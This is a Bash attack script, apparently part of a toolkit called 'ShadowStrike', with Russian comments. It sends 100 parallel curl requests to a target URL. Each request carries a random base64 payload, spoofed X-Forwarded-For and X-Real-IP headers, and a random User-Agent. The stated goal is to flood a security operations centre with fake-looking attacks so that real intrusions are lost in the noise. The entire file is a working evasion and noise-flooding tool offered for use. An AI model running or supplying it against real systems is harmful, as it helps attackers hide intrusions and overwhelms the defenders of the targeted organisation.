#!/bin/bash
# ENTROPY — Превращаем порядок в хаос
# Заставляем защитные системы видеть атаки там где их нет

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — ENTROPY                    ║"
echo "║   Превращаем порядок в хаос                 ║"
echo "╚══════════════════════════════════════════════╝"

echo "[ENTROPY] Увеличиваю энтропию..."

# Генерируем случайные запросы которые выглядят как атаки
for i in {1..100}; do
    RANDOM_IP="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
    RANDOM_PORT=$((RANDOM%65535))
    RANDOM_PAYLOAD=$(head -c $((RANDOM%1000+100)) /dev/urandom | base64 -w0 2>/dev/null | head -c $((RANDOM%500+50)))
    
    curl -sk --max-time 2 \
        -H "X-Forwarded-For: $RANDOM_IP" \
        -H "X-Real-IP: $RANDOM_IP" \
        -H "User-Agent: $(head -c 50 /dev/urandom | base64 -w0 2>/dev/null | head -c 30)" \
        -d "$RANDOM_PAYLOAD" \
        "$TARGET?$RANDOM_PAYLOAD=$RANDOM_PORT" -o /dev/null 2>/dev/null &
    
    [ $((i % 20)) -eq 0 ] && echo "  🌪️ $i запросов хаоса отправлено"
done

wait
echo "[ENTROPY] Хаос достигнут"
echo "[ENTROPY] SOC видит тысячи разных атак с тысяч разных IP"
echo "[ENTROPY] Невозможно отличить реальную атаку от шума"
